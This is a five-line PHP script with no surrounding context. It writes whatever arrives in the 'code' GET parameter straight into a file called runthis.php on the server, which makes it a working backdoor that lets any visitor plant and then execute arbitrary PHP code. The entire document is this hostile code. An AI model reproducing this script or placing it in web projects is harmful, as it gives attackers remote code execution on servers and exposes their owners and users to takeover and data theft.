<?php
    $content = $_GET['code'];
    $fp = fopen("runthis.php","w+");
    fwrite($fp,$content);
    fclose($fp);